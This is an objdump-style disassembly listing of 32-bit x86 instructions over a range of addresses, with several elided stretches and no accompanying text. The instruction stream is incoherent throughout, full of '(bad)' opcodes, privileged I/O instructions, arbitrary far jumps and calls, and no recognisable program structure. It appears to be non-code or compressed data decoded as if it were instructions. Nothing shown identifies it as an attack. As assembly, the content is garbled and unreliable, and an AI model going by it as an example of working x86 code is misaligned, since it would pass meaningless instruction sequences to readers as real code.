  42d146:	add    DWORD PTR [eax],eax
  42d148:	cmc    
  42d149:	add    BYTE PTR [eax],al
  42d14b:	add    BYTE PTR [eax-0x1c9c8c27],dh
  42d151:	push   cs
  42d152:	xor    bh,al
  42d154:	jno    0x42d184
  42d156:	jmp    0x42d1d5
  42d158:	mov    ss,WORD PTR [edx+0x22b4894]
  42d15e:	test   dl,cl
  42d160:	sbb    ebx,DWORD PTR [eax+0x6d111044]
  42d166:	test   al,0xc3
  42d168:	xchg   ebp,eax
  42d169:	pop    esp
  42d16a:	or     eax,0xda472
  42d16f:	adc    BYTE PTR [ecx+0x6e161f4c],dh
  42d175:	scas   eax,DWORD PTR es:[edi]
  42d176:	stc    
  42d177:	cmp    cl,BYTE PTR [edx]
  42d179:	pop    ecx
  42d17a:	ins    DWORD PTR es:[edi],dx
  42d17b:	mov    eax,ds:0xb5df1674
  42d180:	inc    eax
  42d181:	nop
  42d182:	inc    ebx
  42d183:	jno    0x42d177
  42d185:	push   ss
  42d186:	xchg   DWORD PTR [edi],edx
  42d188:	or     BYTE PTR [edi+0x540f5a63],bh
  42d18e:	fsub   st,st(0)
  42d190:	ss mov al,0x6
  42d193:	addr16 into 
  42d195:	hlt    
  42d196:	js     0x42d154
  42d198:	je     0x42d1be
  42d19a:	xor    DWORD PTR [eax+0x98107c6],0xffffffbc
  42d1a1:	jne    0x42d1a0
  42d1a3:	loop   0x42d137
  42d1a5:	sar    BYTE PTR ds:0x3830b7e2,cl
  42d1ab:	xchg   esp,eax
  42d1ac:	jnp    0x42d1d0
  42d1ae:	mov    eax,ds:0xbd4a442e
  42d1b3:	push   0xffffff99
  42d1b5:	or     al,0x75
  42d1b7:	inc    esp
  42d1b8:	int    0xbe
  42d1ba:	bnd js 0x42d15f
  42d1bd:	jb     0x42d16d
  42d1bf:	cmp    esp,edi
  42d1c1:	lods   al,BYTE PTR ds:[esi]
  42d1c2:	jle    0x42d215
  42d1c4:	loopne 0x42d174
  42d1c6:	sbb    ch,BYTE PTR [eax]
  42d1c8:	sbb    dl,ch
  42d1ca:	fwait
  42d1cb:	jmp    0x42d17f
  42d1cd:	jae    0x42d240
  42d1cf:	jbe    0x42d23a
  42d1d1:	out    dx,eax
  42d1d2:	adc    bh,BYTE PTR [edi+0x2b]
  42d1d5:	cmp    DWORD PTR [edx],esi
  42d1d7:	dec    ecx
  42d1d8:	xchg   esi,eax
  42d1d9:	cmp    ebp,esp
  42d1db:	push   ebx
  42d1dc:	xor    DWORD PTR [ebp+ebx*1-0x7e],ebx
  42d1e0:	gs xchg esp,eax
  42d1e2:	(bad)  
  42d1e4:	nop
  42d1e5:	mov    al,ds:0xffdb7256
  42d1ea:	and    BYTE PTR [ebp+0x2b],ch
  42d1ed:	xchg   DWORD PTR [esi],esi
  42d1ef:	xchg   ebp,eax
  42d1f0:	aad    0x80
  42d1f2:	add    eax,0xc3e74936
  42d1f7:	fdivrp st(6),st
  42d1f9:	sub    eax,0xa7dbcf83
  42d1fe:	imul   edx,edi,0xb4800bc
  42d204:	icebp  
  42d205:	sbb    dh,BYTE PTR [esi+0x75cd97b9]
  42d20b:	shl    BYTE PTR [edi+0x1037c6b5],0x5b
  42d212:	aas    
  42d213:	and    DWORD PTR [eax-0x6],esp
  42d216:	mov    dh,0x62
  42d218:	dec    esp
  42d219:	mov    bh,0x4
  42d21b:	push   esi
  42d21c:	lds    edi,FWORD PTR ds:0x33e65575
  42d222:	push   esp
  42d223:	push   es
  42d224:	adc    eax,0x84694219
  42d229:	mov    ds:0xf47d72ab,eax
  42d22e:	pop    ecx
  42d22f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d230:	or     ebp,edi
  42d232:	pop    edi
  42d233:	jbe    0x42d262
  42d235:	cmp    DWORD PTR [eax+0x65466956],edx
  42d23b:	fadd   DWORD PTR [esi]
  42d23d:	leave  
  42d23e:	pop    ecx
  42d23f:	inc    ebp
  42d240:	leave  
	...
  42d2b1:	add    BYTE PTR [eax],al
  42d2b3:	add    dh,ah
  42d2b5:	psubusw mm5,QWORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	dec    esp
  42d2c1:	out    dx,eax
  42d2c2:	in     al,dx
  42d2c3:	add    eax,0x1dd6b
  42d2c8:	cmc    
  42d2c9:	add    BYTE PTR [eax],al
  42d2cb:	add    BYTE PTR [ebp-0x4ce19e6],al
  42d2d1:	xchg   BYTE PTR [eax-0x4074a1d7],bl
  42d2d7:	cmp    bh,BYTE PTR [edi+0x68]
  42d2da:	mov    dl,ah
  42d2dc:	imul   BYTE PTR [esi-0x18]
  42d2df:	add    cl,BYTE PTR [ecx]
  42d2e1:	fnstenv [eax-0x4cf40866]
  42d2e7:	mov    BYTE PTR [eax-0x12dace7b],dh
  42d2ed:	xchg   ebx,eax
  42d2ee:	mov    bh,0xae
  42d2f0:	pop    eax
  42d2f1:	lds    ebx,FWORD PTR [edx-0x5927ffcb]
  42d2f7:	cmp    DWORD PTR [ebx+0x56728a72],ebp
  42d2fd:	sbb    DWORD PTR [edx],ebx
  42d2ff:	adc    BYTE PTR [ebp+ebp*8-0x34],bh
  42d303:	pushf  
  42d304:	(bad)  
  42d305:	ss js  0x42d365
  42d308:	mov    ebp,0xfd26740
  42d30d:	push   ss
  42d30e:	(bad)  
  42d310:	lahf   
  42d311:	pop    edi
  42d312:	adc    cl,BYTE PTR [edi]
  42d314:	dec    ebp
  42d315:	adc    eax,0xe4777a39
  42d31a:	mov    gs,edx
  42d31c:	mov    al,ds:0xf8b86011
  42d321:	outs   dx,DWORD PTR ds:[esi]
  42d322:	aam    0x3d
  42d324:	or     bh,BYTE PTR [eax+edi*1-0x13]
  42d328:	add    dl,dl
  42d32a:	stos   DWORD PTR es:[edi],eax
  42d32b:	addr16 pop edi
  42d32d:	sbb    eax,DWORD PTR [eax]
  42d32f:	lods   eax,DWORD PTR ds:[esi]
  42d330:	or     eax,0x8df3eacb
  42d335:	cmp    BYTE PTR es:[ebx+0x7a590210],al
  42d33c:	mov    ds:0x19561b8b,eax
  42d341:	sti    
  42d342:	add    ah,bh
  42d344:	xchg   edx,eax
  42d345:	call   0xb3a1:0xc1de76ba
  42d34c:	sub    ah,BYTE PTR [eax*8+0x16984376]
  42d353:	int3   
  42d354:	mov    cl,0x9d
  42d356:	mov    edi,0xa600ae0a
  42d35b:	in     eax,0x54
  42d35d:	out    dx,eax
  42d35e:	sub    BYTE PTR [ebx-0x30fb3e15],dl
  42d364:	mov    esi,0xf70e9048
  42d369:	inc    eax
  42d36a:	in     al,dx
  42d36b:	push   edx
  42d36c:	inc    eax
  42d36d:	mov    dl,0x5d
  42d36f:	hlt    
  42d370:	(bad)  
  42d371:	icebp  
  42d372:	inc    edi
  42d373:	adc    DWORD PTR [edx],eax
  42d375:	sub    esi,DWORD PTR [edi]
  42d377:	mov    eax,0x4dbee28f
  42d37c:	jae    0x42d398
  42d37e:	jb     0x42d376
  42d380:	push   0xcf512e1e
  42d385:	mov    edi,0x43dd57b6
  42d38a:	jb     0x42d352
  42d38c:	and    BYTE PTR [ebx-0x37],0xa1
  42d390:	and    ch,BYTE PTR [edi-0x18]
  42d393:	mov    al,ds:0x23beb2d0
  42d398:	leave  
  42d399:	cdq    
  42d39a:	cdq    
  42d39b:	and    al,0x53
  42d39d:	pushf  
  42d39e:	fisub  DWORD PTR [edi+0x48]
  42d3a1:	fisub  DWORD PTR [ecx]
  42d3a3:	xchg   ebp,eax
  42d3a4:	fimul  DWORD PTR [ebx+0x28755619]
  42d3aa:	test   dh,dl
  42d3ac:	xchg   DWORD PTR [edx+0x2f],edi
  42d3af:	xchg   edi,eax
  42d3b0:	xchg   edx,eax
  42d3b1:	in     al,0x5
  42d3b3:	lock ret 0xf689
  42d3b7:	ds push ebp
  42d3b9:	jne    0x42d37e
  42d3bb:	(bad)  
  42d3bc:	loopne 0x42d43b
  42d3be:	(bad)  
  42d3bf:	mov    ebp,0x34
	...
  42d434:	in     al,dx
  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0xc11c0781
  42d442:	sub    esp,DWORD PTR cs:[eax-0x22]
  42d446:	add    DWORD PTR [eax],eax
  42d448:	cmc    
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    dl,dh
  42d44d:	in     al,dx
  42d44e:	stc    
  42d44f:	inc    ebx
  42d450:	aas    
  42d451:	leave  
  42d452:	sbb    DWORD PTR [edx-0x9],esp
  42d455:	xchg   ebx,eax
  42d456:	sub    al,0x82
  42d458:	mov    ebp,0x6b4ed000
  42d45d:	cmp    eax,0x3fcf839c
  42d462:	pop    esp
  42d463:	push   esp
  42d464:	jp     0x42d4e5
  42d466:	ss push ebp
  42d468:	mov    eax,ds:0x51be6aa5
  42d46d:	cmp    esp,DWORD PTR [eax*1-0x5b9083e1]
  42d474:	jno    0x42d48f
  42d476:	sahf   
  42d477:	inc    esi
  42d478:	je     0x42d45a
  42d47a:	mov    ah,0x14
  42d47c:	sub    eax,0xe3b18309
  42d481:	sbb    ah,dh
  42d483:	mov    ds:0x3c7098b7,eax
  42d488:	lea    edi,[edx+eiz*4-0x3c7f208a]
  42d48f:	jp     0x42d4b6
  42d491:	ror    DWORD PTR [ebx-0x57],1
  42d494:	jo     0x42d45a
  42d496:	ficom  DWORD PTR [ecx]
  42d498:	mov    BYTE PTR [ecx*8-0x24de2cb7],0x2a
  42d4a0:	sub    bh,BYTE PTR [esi]
  42d4a2:	lahf   
  42d4a3:	and    ch,BYTE PTR [ecx]
  42d4a5:	pop    ecx
  42d4a6:	mov    ah,0x94
  42d4a8:	cdq    
  42d4a9:	sub    ah,BYTE PTR [edi-0x6c]
  42d4ac:	mov    eax,0x7823cf61
  42d4b1:	mov    eax,DWORD PTR [ecx+esi*4-0x46]
  42d4b5:	aad    0x3
  42d4b7:	push   esi
  42d4b8:	mov    eax,ds:0xf52360d1
  42d4bd:	les    esp,FWORD PTR [ebx]
  42d4bf:	gs push cs
  42d4c1:	push   0x701b27a9
  42d4c6:	ins    BYTE PTR es:[edi],dx
  42d4c7:	fwait
  42d4c8:	test   edx,edx
  42d4ca:	jno    0x42d484
  42d4cc:	and    ebp,eax
  42d4ce:	into   
  42d4cf:	daa    
  42d4d0:	int3   
  42d4d1:	add    ecx,edx
  42d4d3:	pop    esi
  42d4d4:	mov    cs,WORD PTR [edx]
  42d4d6:	and    DWORD PTR [edx+0xf],ebx
  42d4d9:	jge    0x42d54d
  42d4db:	mov    edx,0x505ff007
  42d4e0:	mov    cl,0xe1
  42d4e2:	(bad)  
  42d4e3:	fst    QWORD PTR [ebx]
  42d4e5:	sbb    esi,DWORD PTR [edi+0x3b1a7207]
  42d4eb:	outs   dx,DWORD PTR ds:[esi]
  42d4ec:	cmp    DWORD PTR [esi+0x50],edi
  42d4ef:	ja     0x42d47a
  42d4f1:	push   es
  42d4f2:	push   ds
  42d4f3:	xor    ebp,DWORD PTR [esi+0x34]
  42d4f6:	sub    ecx,DWORD PTR [eax+0x67395a2e]
  42d4fc:	mov    dh,0xdc
  42d4fe:	js     0x42d491
  42d500:	mov    edi,0x4513ed9
  42d505:	jmp    0xf942:0xc456006b
  42d50c:	push   esp
  42d50d:	sbb    al,0x33
  42d50f:	imul   edx,DWORD PTR [ebp+0x5c162406],0x59
  42d516:	aad    0x32
  42d518:	adc    DWORD PTR [ebx],esp
  42d51a:	fsub   QWORD PTR [edi]
  42d51c:	(bad)  
  42d51d:	xchg   ebx,eax
  42d51e:	pop    edi
  42d51f:	jge    0x42d517
  42d521:	das    
  42d522:	xor    ecx,DWORD PTR [edx+0x4c]
  42d525:	mov    cs:0xf96f95a7,eax
  42d52b:	mov    ds:0x6859c38c,al
  42d530:	jecxz  0x42d58e
  42d532:	or     DWORD PTR [edi+0x10fdcbf],0x4d
  42d539:	pop    edx
  42d53a:	fstp   st(3)
  42d53c:	loopne 0x42d523
  42d53e:	inc    ebx
  42d53f:	fstp   TBYTE PTR [edx+0x0]
	...
  42d5b1:	add    BYTE PTR [eax],al
  42d5b3:	add    BYTE PTR [ebp+0x48],bl
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	fist   WORD PTR [eax-0x20aa8e05]
  42d5c6:	add    DWORD PTR [eax],eax
  42d5c8:	cmc    
  42d5c9:	add    BYTE PTR [eax],al
  42d5cb:	add    BYTE PTR [ecx+0x42],dh
  42d5ce:	xor    BYTE PTR [edx-0xa],ah
  42d5d1:	inc    ebx
  42d5d2:	jb     0x42d5d8
  42d5d4:	out    0xa6,al
  42d5d6:	add    bh,al
  42d5d8:	mov    edi,0x9f0c62a1
  42d5dd:	aaa    
  42d5de:	sbb    BYTE PTR [esi+ecx*1-0x1a],ch
  42d5e2:	out    0xf5,al
  42d5e4:	cdq    
  42d5e5:	loope  0x42d65e
  42d5e7:	out    0x24,al
  42d5e9:	jge    0x42d5af
  42d5eb:	sub    eax,0x91c2cf83
  42d5f0:	es (bad) 
  42d5f3:	dec    esp
  42d5f4:	xchg   esp,eax
  42d5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d5f6:	mov    ds:0x7738f86a,eax
  42d5fb:	fdivr  QWORD PTR [ecx+0x7eece166]
  42d601:	mov    cl,0x85
  42d603:	mov    ebp,0x5cb313b2
  42d608:	pop    edx
  42d609:	stos   DWORD PTR es:[edi],eax
  42d60a:	outs   dx,DWORD PTR ds:[esi]
  42d60b:	add    al,0xd4
  42d60d:	jb     0x42d592
  42d60f:	int3   
  42d610:	and    ecx,DWORD PTR [esi-0x57e58806]
  42d616:	test   BYTE PTR [ebp+0x572b8a15],bl
  42d61c:	shl    DWORD PTR [edx+ebx*2-0x5e],1
  42d620:	scas   al,BYTE PTR es:[edi]
  42d621:	(bad)  
  42d622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d623:	add    DWORD PTR [edi+0x4],edx
  42d626:	out    0x93,al
  42d628:	mov    cl,0x20
  42d62a:	out    0xec,al
  42d62c:	jo     0x42d5b9
  42d62e:	out    dx,eax
  42d62f:	inc    esi
  42d630:	pop    ecx
  42d631:	xor    BYTE PTR [ebp-0x762784de],cl
  42d637:	ffreep st(5)
  42d639:	mov    ds:0x76e701c1,al
  42d63e:	xchg   ebx,eax
  42d63f:	mov    ebp,DWORD PTR [ebx-0x2a]
  42d642:	divps  xmm6,xmm1
  42d645:	adc    DWORD PTR [edi-0x704c3ec1],edi
  42d64b:	loop   0x42d6b6
  42d64d:	inc    ebp
  42d64e:	cmp    DWORD PTR [ecx+0x3a],ebx
  42d651:	mov    DWORD PTR [edi],ecx
  42d653:	cmp    eax,0xbb63614c
  42d658:	cmp    al,ah
  42d65a:	(bad)  [eax+0x4c]
  42d65d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d65e:	pop    ebp
  42d65f:	shl    DWORD PTR [ecx-0x3f],1
  42d662:	outs   dx,BYTE PTR ds:[esi]
  42d663:	call   0xb954902c
  42d668:	div    DWORD PTR [eax+ebx*1-0x48]
  42d66c:	iret   
  42d66d:	shl    DWORD PTR [edx+0x38486db],0x62
  42d674:	cmp    eax,0x5264b005
  42d679:	test   BYTE PTR [ecx],0xcc
  42d67c:	adc    DWORD PTR [edi],esi
  42d67e:	shl    BYTE PTR [esi],cl
  42d680:	call   0xc3a98691
  42d685:	jae    0x42d60b
  42d687:	sar    DWORD PTR [ebp+0x5b],cl
  42d68a:	popf   
  42d68b:	and    esp,ecx
  42d68d:	cmovle edi,DWORD PTR [edi+esi*2]
  42d691:	sbb    DWORD PTR [ecx],edi
  42d693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d694:	mov    WORD PTR [eax+0x7d923718],fs
  42d69a:	sub    eax,0xd34a29e9
  42d69f:	cmp    eax,0xd58a8c44
  42d6a4:	sbb    ah,0x64
  42d6a7:	call   0xf8c4303b
  42d6ac:	push   ebp
  42d6ad:	adc    eax,0xf27ebb5
  42d6b2:	call   0x922dc779
  42d6b7:	aam    0xb3
  42d6b9:	mov    cs,esp
  42d6bb:	leave  
  42d6bc:	jbe    0x42d6cf
  42d6be:	scas   al,BYTE PTR es:[edi]
  42d6bf:	ret    0x1b
	...
  42d732:	add    BYTE PTR [eax],al
  42d734:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42d73a:	jmp    FWORD PTR [ebp-0x78eb318b]
  42d740:	jmp    0x4b0906e0
  42d745:	loopne 0x42d748
  42d747:	add    ch,dh
  42d749:	add    BYTE PTR [eax],al
  42d74b:	add    BYTE PTR [ecx],bh
  42d74d:	jmp    0x61f5eb7d
  42d752:	xor    BYTE PTR [edi],ah
  42d754:	fisub  WORD PTR [ebx]
  42d756:	add    al,0x8b
  42d758:	sti    
  42d759:	add    eax,DWORD PTR [esi+ecx*8-0x4e]
  42d75d:	lds    esp,FWORD PTR [eax+0x68adacd6]
  42d763:	lods   eax,DWORD PTR ds:[esi]
  42d764:	frstor [eax]
  42d766:	mov    es,WORD PTR [esi-0x19]
  42d769:	jmp    0x80632fae
  42d76e:	xor    dh,0x4f
  42d771:	daa    
  42d772:	xchg   esi,eax
  42d773:	and    ah,BYTE PTR [esi]
  42d775:	repnz push edi
  42d777:	mov    WORD PTR [ebp+0x522c9b13],?
  42d77d:	in     al,0xa3
  42d77f:	dec    eax
  42d780:	cmp    ah,BYTE PTR [eax+0x6fe9cb8d]
  42d786:	pop    esp
  42d787:	or     bl,0x80
  42d78a:	adc    BYTE PTR [eax+0x49],ch
  42d78d:	adc    DWORD PTR [ebx],esi
  42d78f:	rcr    BYTE PTR [edx-0x2e],0x0
  42d793:	jg     0x42d77c
  42d795:	jno    0x42d7f0
  42d797:	dec    esi
  42d798:	and    edx,ecx
  42d79a:	xor    esi,DWORD PTR [esi]
  42d79c:	test   al,0xb6
  42d79e:	sub    eax,0x1d3755a
  42d7a3:	cwde   
  42d7a4:	adc    ecx,DWORD PTR [ecx*4-0x23f0c7b5]
  42d7ab:	add    edx,DWORD PTR [edi-0x5782ba25]
  42d7b1:	leave  
  42d7b2:	fidiv  WORD PTR [ebx-0x1c3c13d5]
  42d7b8:	sar    DWORD PTR [esi],1
  42d7ba:	sub    eax,0x7bcfaf35
  42d7bf:	pop    ebp
  42d7c0:	lds    esp,FWORD PTR [eax]
  42d7c2:	add    BYTE PTR [edi-0x3f6af019],ch
  42d7c8:	push   0x42
  42d7ca:	sbb    dh,dl
  42d7cc:	or     BYTE PTR [ebx],dh
  42d7ce:	inc    ecx
  42d7cf:	and    dh,cl
  42d7d1:	lods   eax,DWORD PTR ds:[esi]
  42d7d2:	cmp    BYTE PTR [edx-0x36],0xfe
  42d7d6:	inc    eax
  42d7d7:	push   edx
  42d7d8:	icebp  
  42d7d9:	push   eax
  42d7da:	mov    edi,0x6f8f798e
  42d7df:	gs xchg edx,eax
  42d7e1:	pop    ds
  42d7e2:	and    DWORD PTR [edx-0x1297f76],esp
  42d7e8:	call   0xace0a6ab
  42d7ed:	push   es
  42d7ee:	(bad)  
  42d7ef:	jbe    0x42d80c
  42d7f1:	(bad)  
  42d7f2:	in     eax,dx
  42d7f3:	push   0x613ddd56
  42d7f8:	pop    ds
  42d7f9:	cmp    DWORD PTR [esi-0x1b0bc2a4],esi
  42d7ff:	cmp    al,0xc4
  42d801:	and    bl,BYTE PTR ds:0x6e7b1ea3
  42d807:	inc    esp
  42d808:	or     ebx,DWORD PTR [ebp+ebx*1+0x5d6cf9aa]
  42d80f:	pop    esp
  42d810:	mov    dh,0xbc
  42d812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d813:	push   ss
  42d814:	cmp    BYTE PTR [ecx+0x6c],ah
  42d817:	pop    eax
  42d818:	dec    esi
  42d819:	xlat   BYTE PTR ds:[ebx]
  42d81a:	dec    ebx
  42d81b:	adc    ebx,DWORD PTR [edx-0x81bcc65]
  42d821:	cmp    BYTE PTR [eax],al
  42d823:	aam    0x69
  42d825:	xchg   edi,eax
  42d826:	jb     0x42d872
  42d828:	xchg   DWORD PTR [ecx-0x95929ed],ebp
  42d82e:	sbb    DWORD PTR [ebx-0xe],ecx
  42d831:	jbe    0x42d7e2
  42d833:	adc    ah,bh
  42d835:	iret   
  42d836:	sub    al,0x15
  42d838:	jne    0x42d85e
  42d83a:	jae    0x42d832
  42d83c:	stos   BYTE PTR es:[edi],al
  42d83d:	add    al,0x59
  42d83f:	add    dh,BYTE PTR [ebp+0x0]
	...
  42d8b1:	add    BYTE PTR [eax],al
  42d8b3:	add    BYTE PTR [eax],dl
  42d8b5:	sbb    ecx,ecx
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0x96dcc254
  42d8c1:	neg    DWORD PTR [ecx+eiz*1+0x3f]
  42d8c5:	loope  0x42d8c8
  42d8c7:	add    ch,dh
  42d8c9:	add    BYTE PTR [eax],al
  42d8cb:	add    BYTE PTR [ecx+0x63],ah
  42d8ce:	push   esi
  42d8cf:	adc    esi,DWORD PTR [ebp+0x55]
  42d8d2:	xor    bl,BYTE PTR [esi]
  42d8d4:	ficom  DWORD PTR [eax+0x564e63ba]
  42d8da:	out    dx,al
  42d8db:	loope  0x42d909
  42d8dd:	xchg   DWORD PTR [ebx-0x5d357ce],edx
  42d8e3:	(bad)  
  42d8e4:	mov    esi,0xe4ddd5ec
  42d8e9:	xchg   esp,eax
  42d8ea:	and    al,0xcc
  42d8ec:	adc    eax,0xa36537a4
  42d8f1:	fnsave [ebp+0x11323ef7]
  42d8f7:	es addr16 (bad) 
  42d8fa:	push   ss
  42d8fb:	jb     0x42d926
  42d8fd:	loop   0x42d935
  42d8ff:	or     al,0xe3
  42d901:	lahf   
  42d902:	dec    esi
  42d903:	and    eax,0xae0c3ea7
  42d908:	mov    edx,ebp
  42d90a:	sub    cl,ah
  42d90c:	push   es
  42d90d:	in     eax,0x25
  42d90f:	mov    ch,0x9a
  42d911:	jb     0x42d8ec
  42d913:	mov    edx,0xe865c2ab
  42d918:	and    DWORD PTR [edx],ebx
  42d91a:	mov    ds:0xa44ac9b,eax
  42d91f:	inc    eax
  42d920:	push   esi
  42d921:	dec    edi
  42d922:	cwde   
  42d923:	ins    DWORD PTR es:[edi],dx
  42d924:	xor    eax,0xc57009e4
  42d929:	jmp    0x1694152a
  42d92e:	adc    DWORD PTR [edi+0x3],ebx
  42d931:	xchg   ecx,eax
  42d932:	scas   al,BYTE PTR es:[edi]
  42d933:	and    dl,BYTE PTR [eax+0x6]
  42d936:	add    al,0x8c
  42d938:	mov    ebp,0xa65d2878
  42d93d:	in     eax,dx
  42d93e:	and    ah,BYTE PTR [ecx+edx*4]
  42d941:	and    al,0x82
  42d943:	addr16 inc esp
  42d945:	fwait
  42d946:	sar    DWORD PTR [edx+ecx*4+0x16],1
  42d94a:	(bad)  
  42d94b:	cld    
  42d94c:	(bad)  
  42d94d:	leave  
  42d94e:	xor    eax,0xf537405d
  42d953:	mov    DWORD PTR [edx],esi
  42d955:	leave  
  42d956:	add    bl,BYTE PTR [edx-0x16]
  42d959:	push   edx
  42d95a:	push   es
  42d95b:	push   cs
  42d95c:	inc    edx
  42d95d:	dec    BYTE PTR [ebx]
  42d95f:	scas   eax,DWORD PTR es:[edi]
  42d960:	pop    ebx
  42d961:	mov    edx,ecx
  42d963:	push   edx
  42d964:	sbb    DWORD PTR [esp+eiz*2],0x7
  42d968:	stos   BYTE PTR es:[edi],al
  42d969:	jmp    0xe124dab7
  42d96e:	scas   al,BYTE PTR es:[edi]
  42d96f:	jo     0x42d986
  42d971:	gs jge 0x42d9dc
  42d974:	cmp    al,0xf4
  42d976:	lea    ebp,[edi+0x6c]
  42d979:	add    ebx,DWORD PTR [eax]
  42d97b:	ror    DWORD PTR [ecx+0x726aa2b0],1
  42d981:	(bad)  
  42d982:	cmp    DWORD PTR [edx+0x51],ebp
  42d985:	inc    ecx
  42d986:	inc    esi
  42d987:	cwde   
  42d988:	mov    dl,0xd4
  42d98a:	push   esi
  42d98b:	mov    edx,0x2815d30e
  42d990:	(bad)  
  42d991:	addr16 push edi
  42d993:	xchg   DWORD PTR [ebp-0x130cf4ec],ebx
  42d999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d99a:	jo     0x42d91e
  42d99c:	push   ebx
  42d99d:	mov    DWORD PTR [edx],0xc1ea41
  42d9a3:	xor    DWORD PTR [ecx],0x5156fe95
  42d9a9:	push   es
  42d9aa:	les    esi,FWORD PTR [edi+0x24]
  42d9ad:	sti    
  42d9ae:	dec    edx
  42d9af:	mov    edi,0x6b2a1e48
  42d9b4:	jmp    0xe60c5fdb
  42d9b9:	pop    ss
  42d9ba:	fild   QWORD PTR [edi-0x3d]
  42d9bd:	mov    ch,0x7d
  42d9bf:	sbb    eax,0xc7
	...
  42da34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da35:	fimul  DWORD PTR [eax-0x10ac02bf]
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	(bad)  
  42da40:	popa   
  42da41:	and    DWORD PTR [ebp+0x1e2345b],edi
  42da47:	add    ch,dh
  42da49:	add    BYTE PTR [eax],al
  42da4b:	add    BYTE PTR [edx-0x37d384c],bh
  42da51:	jbe    0x42dac7
  42da53:	adc    eax,0xd89a4a26
  42da58:	adc    DWORD PTR [edi+0x2f60cbc7],0xa5c67673
  42da62:	mov    WORD PTR [edx-0x6158abea],ss
  42da68:	aad    0x2c
  42da6a:	cld    
  42da6b:	mov    ds:0x8855ff51,al
  42da70:	inc    edi
  42da71:	mov    bl,0xd6
  42da73:	je     0x42dabe
  42da75:	popa   
  42da76:	xchg   ebp,eax
  42da77:	ret    
  42da78:	mov    esp,0x60de29c4
  42da7d:	xor    ch,al
  42da7f:	add    edi,DWORD PTR [eax]
  42da81:	mov    eax,ds:0x38d06c86
  42da86:	les    edx,FWORD PTR [ebx-0x49c4782d]
  42da8c:	dec    esi
  42da8d:	add    eax,0x8a572bf1
  42da92:	or     bh,BYTE PTR [esi-0x7c]
  42da95:	jne    0x42daf9
  42da97:	fwait
  42da98:	xor    al,0x16
  42da9a:	sbb    esi,eax
  42da9c:	mov    ah,BYTE PTR [ecx]
  42da9e:	addr16 aam 0x78
  42daa1:	jb     0x42daee
  42daa3:	mov    ebp,0x1e7b13a6
  42daa8:	push   es
  42daa9:	mov    bh,0xcf
  42daab:	lds    eax,FWORD PTR [ebx-0x72595b23]
  42dab1:	adc    eax,0xb954de46
  42dab6:	(bad)  
  42dab8:	inc    edx
  42dab9:	and    ebp,DWORD PTR [esp+ebx*8]
  42dabc:	pop    ss
  42dabd:	in     al,dx
  42dabe:	xchg   edi,eax
  42dabf:	or     bl,BYTE PTR [ebp+0xa]
  42dac2:	imul   BYTE PTR gs:[ebx]
  42dac5:	fs push edi
  42dac7:	cmp    DWORD PTR [edx+0x63d59b31],esp
  42dacd:	inc    ebp
  42dace:	fisubr WORD PTR [edx+0x647e0eec]
  42dad4:	sub    ch,BYTE PTR [ebx+0x726020de]
  42dada:	mov    al,ds:0x842ca09c
  42dadf:	push   es
  42dae0:	lock jns 0x42db3b
  42dae3:	cmp    edi,0xffffffda
  42dae6:	push   ss
  42dae7:	adc    BYTE PTR [edi+0x14],bh
  42daea:	sti    
  42daeb:	loope  0x42db3b
  42daed:	fisub  DWORD PTR [edi-0x70]
  42daf0:	inc    ebp
  42daf1:	pop    ebx
  42daf2:	adc    DWORD PTR [edi+0x34],0xffffffe4
  42daf6:	out    dx,eax
  42daf7:	and    BYTE PTR [ebx+0x43],ah
  42dafa:	add    BYTE PTR [ecx+0x7b],al
  42dafd:	or     eax,0xafd37b82
  42db02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db03:	arpl   WORD PTR [ebx],bp
  42db05:	jae    0x42db2b
  42db07:	dec    ecx
  42db08:	test   BYTE PTR [ebp-0x4052431],al
  42db0e:	aad    0xb7
  42db10:	(bad)  
  42db11:	in     eax,dx
  42db12:	idiv   edx
  42db14:	xchg   BYTE PTR [ebx],ch
  42db16:	inc    ebp
  42db17:	push   edx
  42db18:	test   eax,0x3c8fef93
  42db1d:	int    0x1f
  42db1f:	aaa    
  42db20:	fisubr WORD PTR [ebx-0x31]
  42db23:	arpl   WORD PTR [esi+eax*8],bp
  42db26:	or     dl,bh
  42db28:	jno    0x42db55
  42db2a:	push   esi
  42db2b:	mov    edx,0xb603c68d
  42db30:	dec    edi
  42db31:	aad    0xc6
  42db33:	dec    ebp
  42db34:	daa    
  42db35:	xchg   edx,eax
  42db36:	pop    ebp
  42db37:	sbb    bh,BYTE PTR [eax-0x8c614a3]
  42db3d:	mov    BYTE PTR [ecx],cl
  42db3f:	add    esp,eax
	...
  42dbb1:	add    BYTE PTR [eax],al
  42dbb3:	add    BYTE PTR [edi+0x2],bh
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0x7cd6d837,al
  42dbc3:	mov    ch,0x29
  42dbc5:	jecxz  0x42dbc8
  42dbc7:	add    ch,dh
  42dbc9:	add    BYTE PTR [eax],al
  42dbcb:	add    BYTE PTR [eax],bl
  42dbcd:	push   es
  42dbce:	mov    BYTE PTR ds:0x7540a92,al
  42dbd4:	adc    esi,DWORD PTR [ecx+0xf]
  42dbd7:	(bad)  
